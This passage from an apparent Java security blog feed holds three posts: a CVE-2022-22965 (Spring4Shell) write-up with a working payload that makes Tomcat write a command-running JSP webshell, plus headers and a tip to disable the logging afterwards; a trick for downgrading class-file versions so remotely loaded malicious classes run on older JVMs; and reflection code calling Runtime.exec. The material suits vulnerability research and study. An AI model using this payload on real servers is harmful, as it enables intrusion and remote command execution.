operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CVE-2022-22965在Java9新增了module之后:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;directory&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;webapps&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;ROOT
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;prefix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;shell
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;suffix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;jsp
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fileDateFormat&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pattern&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc2&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;j&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;pwd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;InputStream&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;in&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc1&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;cmd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;int&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;new&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B2048&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bsuffix&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后访问webshell的时候，除了提供cmd的参数之外，还需要设置header头：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;headers &amp;#x3D; &amp;#123;&amp;quot;suffix&amp;quot;:&amp;quot;%&amp;gt;&amp;#x2F;&amp;#x2F;&amp;quot;,
            &amp;quot;c1&amp;quot;:&amp;quot;Runtime&amp;quot;,
            &amp;quot;c2&amp;quot;:&amp;quot;&amp;lt;%&amp;quot;,
            &amp;quot;DNT&amp;quot;:&amp;quot;1&amp;quot;,
            &amp;quot;Content-Type&amp;quot;:&amp;quot;application&amp;#x2F;x-www-form-urlencoded&amp;quot;
&amp;#125;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;利用条件&quot;&gt;&lt;a href=&quot;#利用条件&quot; class=&quot;headerlink&quot; title=&quot;利用条件&quot;&gt;&lt;/a&gt;利用条件&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Java版本&amp;gt;=JDK9 &lt;/li&gt;
&lt;li&gt;Spirng运行在Tomcat环境下，以War包部署(Jar包的时候不存在)&lt;/li&gt;
&lt;li&gt;方法入参是非基础类，不能是String，int等&lt;/li&gt;
&lt;li&gt;接口使用了POJO参数绑定&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;注意事项&quot;&gt;&lt;a href=&quot;#注意事项&quot; class=&quot;headerlink&quot; title=&quot;注意事项&quot;&gt;&lt;/a&gt;注意事项&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;如果要多次写文件，需要修改fileDateFormat属性，最终会拼接到文件后缀里面&lt;/li&gt;
&lt;li&gt;利用日志写入shell的时候，生成的文件会不断写入，可以关闭日志记录: &lt;code&gt;class.module.classLoader.resources.context.parent.pipeline.first.enabled=false&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;&lt;p&gt;当Content-Type是&lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt;的时候，会使用&lt;code&gt;ServletModelAttributeMethodProcessor&lt;/code&gt;解析请求，然后进入参数绑定:&lt;code&gt;org.springframework.web.bind.ServletRequestDataBinder#bind(ServletRequest request)&lt;/code&gt;:&lt;br&gt;&lt;img src=&quot;/2022/04/06/CVE-2022-22965/3.png&quot;&gt;&lt;br&gt;此时的mpv保存了请求里面的key-value参数，接着进入&lt;code&gt;org.springframework.validation.DataBinder#doBind(MutablePropertyValues mpvs)&lt;/code&gt;对获取到的&lt;code&gt;mpvs&lt;/code&gt;进行初步校验：&lt;br&gt;&lt;img src=&quot;/2022/04/06/CVE-2022-22965/4.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>低版本Java运行高版的Class</title>
    <link href="https://jkme.github.io/2022/03/30/Load_Class_In_Multi_JavaVersion.html"/>
    <id>https://jkme.github.io/2022/03/30/Load_Class_In_Multi_JavaVersion.html</id>
    <published>2022-03-29T16:00:00.000Z</published>
    <updated>2022-03-30T09:25:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-背景介绍"><a href="#0x1-背景介绍" class="headerlink" title="0x1. 背景介绍"></a>0x1. 背景介绍</h2><p>比如<code>fastjson</code>、<code>log4j</code>中需要远程加载恶意class文件的时候，如果恶意Class文件的版本高于目标版本，比如托管在服务器的Class是1.8编译的，但是目标版本是1.7，会导致利用失败。出现类似这样的错误：<code>java.lang.UnsupportedClassVersionError: Unsupported major.minor version</code></p><h2 id="0x2-解决方法"><a href="#0x2-解决方法" class="headerlink" title="0x2. 解决方法"></a>0x2. 解决方法</h2><p>用低版本的Java，比如1.6去编译Class文件，就可以全版本通用。</p><p>还有另外一种方法，手动修改Class文件。当Java版本不同的时候，编译出来的Class文件也会不一样，其中Class文件里面会带上编译的Java版本号：<br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/1.png"></p><ul><li>45 = Java 1.1</li><li>46 = Java 1.2</li><li>47 = Java 1.3</li><li>48 = Java 1.4</li><li>49 = Java 5</li><li>50 = Java 6</li><li>51 = Java 7</li><li>52 = Java 8</li><li>53 = Java 9</li><li>54 = Java 10</li><li>55 = Java 11</li><li>56 = Java 12</li><li>57 = Java 13</li><li>58 = Java 14</li><li>59 = Java 15</li></ul><p>所以，尝试手动修改一下这个版本号试试？</p><ol><li>切换到<code>java</code>的15版本，编译运行正常</li><li>使用<code>vim -b Calc.class</code>，然后<code>:%!xxd</code>修改版本号为<code>32</code>(50的16进制，也就是Java6)，然后保存:<code>:%!xxd -r</code></li><li>切换java版本到1.7，运行Class正常<br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/2.png"><br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/3.png"></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-背景介绍&quot;&gt;&lt;a href=&quot;#0x1-背景介绍&quot; class=&quot;headerlink&quot; title=&quot;0x1. 背景介绍&quot;&gt;&lt;/a&gt;0x1. 背景介绍&lt;/h2&gt;&lt;p&gt;比如&lt;code&gt;fastjson&lt;/code&gt;、&lt;code&gt;log4j&lt;/code&gt;中需要远程加载恶意class文件的时候，如果恶意Class文件的版本高于目标版本，比如托管在服务器的Class是1.8编译的，但是目标版本是1.7，会导致利用失败。出现类似这样的错误：&lt;code&gt;java.lang.UnsupportedClassVersionError: Unsupported major.minor version&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x2-解决方法&quot;&gt;&lt;a href=&quot;#0x2-解决方法&quot; class=&quot;headerlink&quot; title=&quot;0x2. 解决方法&quot;&gt;&lt;/a&gt;0x2. 解决方法&lt;/h2&gt;&lt;p&gt;用低版本的Java，比如1.6去编译Class文件，就可以全版本通用。&lt;/p&gt;
&lt;p&gt;还有另外一种方法，手动修改Class文件。当Java版本不同的时候，编译出来的Class文件也会不一样，其中Class文件里面会带上编译的Java版本号：&lt;br&gt;&lt;img src=&quot;/2022/03/30/Load_Class_In_Multi_JavaVersion/1.png&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;45 = Java 1.1&lt;/li&gt;
&lt;li&gt;46 = Java 1.2&lt;/li&gt;
&lt;li&gt;47 = Java 1.3&lt;/li&gt;
&lt;li&gt;48 = Java 1.4&lt;/li&gt;
&lt;li&gt;49 = Java 5&lt;/li&gt;
&lt;li&gt;50 = Java 6&lt;/li&gt;
&lt;li&gt;51 = Java 7&lt;/li&gt;
&lt;li&gt;52 = Java 8&lt;/li&gt;
&lt;li&gt;53 = Java 9&lt;/li&gt;
&lt;li&gt;54 = Java 10&lt;/li&gt;
&lt;li&gt;55 = Java 11&lt;/li&gt;
&lt;li&gt;56 = Java 12&lt;/li&gt;
&lt;li&gt;57 = Java 13&lt;/li&gt;
&lt;li&gt;58 = Java 14&lt;/li&gt;
&lt;li&gt;59 = Java 15&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以，尝试手动修改一下这个版本号试试？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;切换到&lt;code&gt;java&lt;/code&gt;的15版本，编译运行正常&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;vim -b Calc.class&lt;/code&gt;，然后&lt;code&gt;:%!xxd&lt;/code&gt;修改版本号为&lt;code&gt;32&lt;/code&gt;(50的16进制，也就是Java6)，然后保存:&lt;code&gt;:%!xxd -r&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;切换java版本到1.7，运行Class正常&lt;br&gt;&lt;img src=&quot;/2022/03/30/Load_Class_In_Multi_JavaVersion/2.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/2022/03/30/Load_Class_In_Multi_JavaVersion/3.png&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全笔记(2)-反射执行系统命令</title>
    <link href="https://jkme.github.io/2022/03/22/java-reflection-shell.html"/>
    <id>https://jkme.github.io/2022/03/22/java-reflection-shell.html</id>
    <published>2022-03-21T16:00:00.000Z</published>
    <updated>2022-04-02T07:37:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h2><p>Runtime中可以获取到<code>Runtime</code>实例有三种方法:</p><ol><li><code>private static Runtime currentRuntime = new Runtime();</code></li><li><code>public static Runtime getRuntime()</code></li><li><code>private Runtime() &#123;&#125;</code></li></ol><p><img src="/2022/03/22/java-reflection-shell/2.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectRuntime</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">//利用私有变量生成实例 private static Runtime currentRuntime = new Runtime();</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"currentRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Runtime1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">//利用     public static Runtime getRuntime() &#123;</span>        <span class="token comment">//        return currentRuntime;</span>        <span class="token comment">//    &#125;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> 